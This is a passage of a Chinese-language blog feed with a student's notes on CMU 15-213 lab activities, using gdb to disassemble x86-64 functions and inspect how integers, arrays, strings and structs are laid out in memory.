&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// arg in %rbx&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mrec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; rbx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;//int* temp = rbx; // 保存 % rbx&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ebx &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; edi&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//rbx 重新赋值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;edi &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        eax &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; edi&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 返回值 = edi&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;//rbx = temp; // 获得 rbx 原值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; eax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    edi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; rdi &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// edi -= 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; eax &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mrec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获得返回值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    eax &lt;span class=&#34;token operator&#34;&gt;*=&lt;/span&gt; ebx&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 返回值 * ebx&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;//rbx = temp; // 获得 rbx 原值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; eax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 一个更加 C 的版本&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mrec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mrec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;推测该函数实现了 &lt;code&gt;x&lt;/code&gt;  的阶乘？&lt;/p&gt;
&lt;h2 id=&#34;activity-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#activity-3&#34;&gt;#&lt;/a&gt; Activity 3&lt;/h2&gt;
&lt;p&gt;重新运行 &lt;code&gt;gdb -args ./calls&lt;/code&gt; ，运行到 &lt;code&gt;showStack&lt;/code&gt;  处，打印 &lt;code&gt;$rip&lt;/code&gt;  前 3 个字节，得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/3b $rsp
0x7fffffffdde0: 0x13    0x52    0x01
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到数字 &lt;code&gt;0x15213&lt;/code&gt;  的高位存放在高字节中，低位存放在低字节中，该机器使用的是小端法。&lt;/p&gt;
</content>
        <updated>2024-02-29T09:18:15.000Z</updated>
    </entry>
    <entry>
        <id>https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20data%20activity/</id>
        <title>15-213 Machine Data Activity 记录</title>
        <link rel="alternate" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20data%20activity/"/>
        <content type="html">&lt;p&gt;输入 &lt;code&gt;gdb ./data-layout&lt;/code&gt; ，开启 &lt;code&gt;Data activity&lt;/code&gt;  之旅。&lt;/p&gt;
&lt;h2 id=&#34;integers-and-local-variables&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#integers-and-local-variables&#34;&gt;#&lt;/a&gt; Integers and Local Variables&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;returnOne&lt;/code&gt;  的 C 语言版本如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;returnOne&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; local &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;abs&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;local&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;输入 &lt;code&gt;disassemble returnOne&lt;/code&gt; ，得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble returnOne
Dump of assembler code for function returnOne:
   0x0000000000400581 &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x0000000000400585 &amp;lt;+4&amp;gt;:     mov    $0xffffffff,%edi
   0x000000000040058a &amp;lt;+9&amp;gt;:     callq  0x400613 &amp;lt;abs&amp;gt;
   0x000000000040058f &amp;lt;+14&amp;gt;:    add    $0x8,%rsp
   0x0000000000400593 &amp;lt;+18&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到首先我们为 &lt;code&gt;returnOne&lt;/code&gt;  预留了 8 个字节的栈空间。将 &lt;code&gt;0xffffffff&lt;/code&gt;  放入 &lt;code&gt;%edi&lt;/code&gt; （应该是传入函数的第一个参数寄存器）。然后调用 &lt;code&gt;abs&lt;/code&gt; ，最后还原栈空间。&lt;/p&gt;
&lt;p&gt;对 &lt;code&gt;abs&lt;/code&gt;  进行反汇编结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble abs
Dump of assembler code for function abs:
   0x0000000000400613 &amp;lt;+0&amp;gt;:     mov    %edi,%edx
   0x0000000000400615 &amp;lt;+2&amp;gt;:     sar    $0x1f,%edx
   0x0000000000400618 &amp;lt;+5&amp;gt;:     mov    %edi,%eax
   0x000000000040061a &amp;lt;+7&amp;gt;:     xor    %edx,%eax
   0x000000000040061c &amp;lt;+9&amp;gt;:     sub    %edx,%eax
   0x000000000040061e &amp;lt;+11&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;abs&lt;/code&gt;  所做的是把 &lt;code&gt;%edi&lt;/code&gt;  放入 &lt;code&gt;%edx&lt;/code&gt; ，然后将其右移 31 位（也就是让符号位充满），将其和原值相异或，然后再减去全符号位。最后返回 &lt;code&gt;%eax&lt;/code&gt; 。此处 &lt;code&gt;local&lt;/code&gt;  变量应该是存储在寄存器 &lt;code&gt;%edi&lt;/code&gt;  中。这里的问题是如果 &lt;code&gt;local&lt;/code&gt;  不在栈上，那么我们就没有办法获取它的地址。如果需要 &lt;code&gt;local&lt;/code&gt;  的地址的话，我们可能需要将其压在栈上，然后使用 &lt;code&gt;leaq %rsp, %rdi&lt;/code&gt;  获取它的地址。&lt;/p&gt;
&lt;p&gt;为了验证我们的结论，我们对 &lt;code&gt;returnOneTwo&lt;/code&gt;  进行反汇编：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble returnOneTwo
Dump of assembler code for function returnOneTwo:
   0x0000000000400594 &amp;lt;+0&amp;gt;:     sub    $0x18,%rsp
   0x0000000000400598 &amp;lt;+4&amp;gt;:     movl   $0xffffffff,0xc(%rsp)
   0x00000000004005a0 &amp;lt;+12&amp;gt;:    lea    0xc(%rsp),%rdi
   0x00000000004005a5 &amp;lt;+17&amp;gt;:    callq  0x40061f &amp;lt;absp&amp;gt;
   0x00000000004005aa &amp;lt;+22&amp;gt;:    add    $0x18,%rsp
   0x00000000004005ae &amp;lt;+26&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该函数所做的是预留 24 个字节的空间，然后把 &lt;code&gt;0xffffffff&lt;/code&gt;  放入 &lt;code&gt;M[%rsp + 12]&lt;/code&gt;  的位置上，并且将指向该位置的指针赋给 &lt;code&gt;%rdi&lt;/code&gt; ，随后调用 &lt;code&gt;absp&lt;/code&gt; 。由此推测， &lt;code&gt;absp&lt;/code&gt;  的传入参数是一个指针（ &lt;code&gt;%rdi&lt;/code&gt;  中）。调用完成后恢复栈空间。&lt;/p&gt;
&lt;p&gt;因此， &lt;code&gt;absp&lt;/code&gt;  的函数原型应该是 &lt;code&gt;int absp(int* p)&lt;/code&gt; 。&lt;/p&gt;
&lt;h2 id=&#34;arrays&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#arrays&#34;&gt;#&lt;/a&gt; Arrays&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;x&lt;/code&gt;  的几种不同格式的显示&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ODkzMDhkZDM2ZGM=&#34;&gt;见此&lt;/span&gt;。这里的显示需要指明 3 个内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;显示几个单位&lt;/li&gt;
&lt;li&gt;每个单位几个字节：如 b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes（如果不指定，默认 1 字节）&lt;/li&gt;
&lt;li&gt;用几进制显示： &lt;code&gt;b&lt;/code&gt;  就是 2 进制， &lt;code&gt;x&lt;/code&gt;  就是 16 进制， &lt;code&gt;d&lt;/code&gt;  就是 10 进制&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用 &lt;code&gt;x/4b courses&lt;/code&gt;  只能查看 4 个字节，以 10 进制数显示，结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/4b courses
0x601110 &amp;lt;courses&amp;gt;:     19      82      1       0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用 &lt;code&gt;x/4x courses&lt;/code&gt;  只能查看 4 个字节，以 16 进制数显示，结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/4x courses
0x601110 &amp;lt;courses&amp;gt;:     0x13    0x52    0x01    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用 &lt;code&gt;x/4wx courses&lt;/code&gt;  查看 &lt;code&gt;courses&lt;/code&gt;  处的 4 个 &lt;code&gt;int&lt;/code&gt;  类型值。 &lt;code&gt;w&lt;/code&gt;  是 4 个字节。结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/4wx courses
0x601110 &amp;lt;courses&amp;gt;:     0x00015213      0x00015513      0x00018213      0x00018600
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到 &lt;code&gt;courses&lt;/code&gt;  处存放了 4 个值：15213 15513 18213 18600，对应数组中的 4 个元素。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;getNth&lt;/code&gt;  函数的 C 语言形式如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getNth&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;arr &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt; index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;其中 &lt;code&gt;%rdi&lt;/code&gt;  是数组的起始位置 ( &lt;code&gt;arr&lt;/code&gt; )， &lt;code&gt;%rsi&lt;/code&gt;  是索引 ( &lt;code&gt;index&lt;/code&gt; )。因为一个 &lt;code&gt;int&lt;/code&gt;  类型是 4 个字节，因此计算地址的时候是 &lt;code&gt;*(rdi + 4 * rsi)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;对 &lt;code&gt;getNth&lt;/code&gt;  函数进行反汇编可得：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble getNth
Dump of assembler code for function getNth:
   0x00000000004005af &amp;lt;+0&amp;gt;:     mov    (%rdi,%rsi,4),%eax
   0x00000000004005b2 &amp;lt;+3&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重新运行，输入一次 &lt;code&gt;c&lt;/code&gt; ，输入 &lt;code&gt;x/bx $rdi&lt;/code&gt;  可得：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s $rdi
0x4007f8:       &amp;quot;15213 CSAPP&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此处的字符串是 &lt;code&gt;15213 CSAPP&lt;/code&gt; 。（推测 &lt;code&gt;x/s $rdi&lt;/code&gt;  的意思以字符串的形式打印从 &lt;code&gt;$rdi&lt;/code&gt;  开始的内存）。输入 &lt;code&gt;x/12bx $rdi&lt;/code&gt; ，可以得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/12bx $rdi
0x4007f8:       0x31    0x35    0x32    0x31    0x33    0x20    0x43    0x53
0x400800:       0x41    0x50    0x50    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;字符串的结尾是 &lt;code&gt;0x00&lt;/code&gt; ， &lt;code&gt;x/s&lt;/code&gt;  命令应该是通过 &lt;code&gt;0x00&lt;/code&gt;  判断字符串的结尾，进而计算字符串的长度的。&lt;/p&gt;
&lt;h2 id=&#34;structs&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#structs&#34;&gt;#&lt;/a&gt; Structs&lt;/h2&gt;
&lt;p&gt;定义 &lt;code&gt;struct course&lt;/code&gt;  如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;course&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; cs_ugrad&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; cs_grad&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; ece_ugrad &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; ece_grad&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;继续输入 &lt;code&gt;c&lt;/code&gt; ，handout 提示断点处的函数将 &lt;code&gt;struct course&lt;/code&gt;  结构的值作为传入参数，使用 &lt;code&gt; x/4wx $rdi&lt;/code&gt;  查看 &lt;code&gt;%rdi&lt;/code&gt;  处的内存可以看到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/4wx $rdi
0x601100 &amp;lt;course&amp;gt;:      0x00015213      0x00015513      0x00018213      0x00018600
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们可以发现该处的四个值就是： &lt;code&gt;0x15213 0x15513 0x18213 0x18600&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们定义结构体：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;increasing&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;short&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; d&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token 